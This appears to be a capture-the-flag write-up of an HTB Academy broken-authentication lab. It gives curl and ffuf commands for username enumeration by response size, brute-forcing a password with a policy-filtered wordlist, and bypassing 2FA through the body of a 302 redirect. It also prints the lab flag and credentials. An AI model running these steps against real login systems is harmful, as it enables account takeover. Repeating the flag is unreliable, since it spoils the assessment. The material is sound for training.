# HTB Academy — CWES Broken Authentication Skills Assessment

**Flag:** `HTB{d86115e037388d0fa29280b737fd9171}`  
**Attack Chain:** Response-size user enumeration → policy-filtered password brute force → direct access bypass past 2FA gate

---

## Session Notes

```
Target:          154.57.164.75:30946
App:             MetaDocs
Valid username:  gladys
Password:        dWinaldasD13
Password policy: exactly 12 chars, upper+lower+digit, NO special characters
2FA:             /2fa.php (4-digit OTP, bypassed via direct access)
Flag location:   /profile.php (302 body — direct access bypass)
```

---

## Step 1 — Reconnaissance

```bash
curl -s http://154.57.164.75:30946/index.php | grep -i "href\|login"
```

Found login button pointing to `/login.php`. Enumerated endpoints:
- `/login.php` — POST, fields: `username`, `password`
- `/register.php` — POST, fields: `username`, `password`
- `/2fa.php` — 302 (redirects to login.php), but body contains OTP form → direct access bypass candidate
- `/profile.php` — 302, empty body initially (but accessible with post-login session)

---

## Step 2 — User Enumeration via Response Size

Error message was identical for both invalid username and valid username + wrong password: `"Unknown username or password."` — no text-based enumeration possible.

Established size baseline:
```bash
# Invalid username response size
curl -s -X POST http://154.57.164.75:30946/login.php \
  -d "username=invalidxyz&password=test" | wc -c
# → 4353

# Valid username (registered testuser) + wrong password
curl -s -X POST http://154.57.164.75:30946/login.php \
  -d "username=testuser&password=wrongpass" | wc -c
# → 4344
```

Enumerated valid users filtering by invalid size (4353):
```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
  -u http://154.57.164.75:30946/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" \
  -fs 4353
```

Result: **`gladys`**

---

## Step 3 — Password Policy + Wordlist Filtering

Registered account to reveal policy:
```bash
curl -s -X POST http://154.57.164.75:30946/register.php \
  -d "username=testuser&password=Test1234!"
# → "Contains NO special characters" + "Is exactly 12 characters long"
```

Full policy:
- Exactly 12 characters
- At least one uppercase
- At least one lowercase
- At least one digit
- **NO special characters**

Filtered wordlist with awk (single pass):
```bash
awk 'length($0) == 12 && /[A-Z]/ && /[a-z]/ && /[0-9]/ && !/[^a-zA-Z0-9]/' \
  /usr/share/wordlists/rockyou.txt > custom_wordlist.txt
```

---

## Step 4 — Password Brute Force

```bash
ffuf -w ./custom_wordlist.txt \
  -u http://154.57.164.75:30946/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=gladys&password=FUZZ" \
  -fs 4344
```

Result: **`dWinaldasD13`**

---

## Step 5 — Login + 2FA Encounter

```bash
curl -s -X POST http://154.57.164.75:30946/login.php \
  -d "username=gladys&password=dWinaldasD13" \
  -c cookies.txt -D - | grep "PHPSESSID\|location"
# → Location: /2fa.php
# → PHPSESSID=<session>
```

2FA brute force attempted (4-digit OTP, `/2fa.php`, field `otp`). Session kept expiring before completing 10,000 attempts even at 20 threads — run took ~1 minute but session timeout was shorter.

---

## Step 6 — Direct Access Bypass Past 2FA

Post-login session is authenticated past the login check but not past the 2FA check. The `/profile.php` endpoint uses PHP redirect without `exit`, so response body is returned in the 302:

```bash
curl -s http://154.57.164.75:30946/profile.php \
  -b "PHPSESSID=<POST_LOGIN_SESSION>" | grep -i "flag\|HTB{"
# → HTB{d86115e037388d0fa29280b737fd9171}
```

---

## Key Lessons

### Same error message doesn't mean enumeration is impossible
"Unknown username or password" hid the difference — but response SIZE differed by 9 bytes. Always compare sizes when text-based enumeration fails.

### Password policy massively reduces wordlist size
"Exactly 12 chars + no special chars" cut rockyou from 14M to a manageable set. Always register a test account before attacking to reveal the policy.

### Use awk not chained grep for complex filters
Chained grep on a 14M line binary file is slow. awk handles multiple conditions (exact length, char class presence, char class exclusion) in a single pass.

### 2FA is a gate, not a wall — check if the page behind it is bypassed
The 2FA brute force was a valid path but had a session timeout problem. The direct access bypass on `/profile.php` was the actual vulnerability — PHP redirect without `exit` means the flag was in the 302 body, accessible with a post-login (pre-2FA) session.

### Always check 302 response bodies
Browsers hide them; curl shows them. A protected page that redirects without `exit` leaks its content to any HTTP client that doesn't follow redirects.
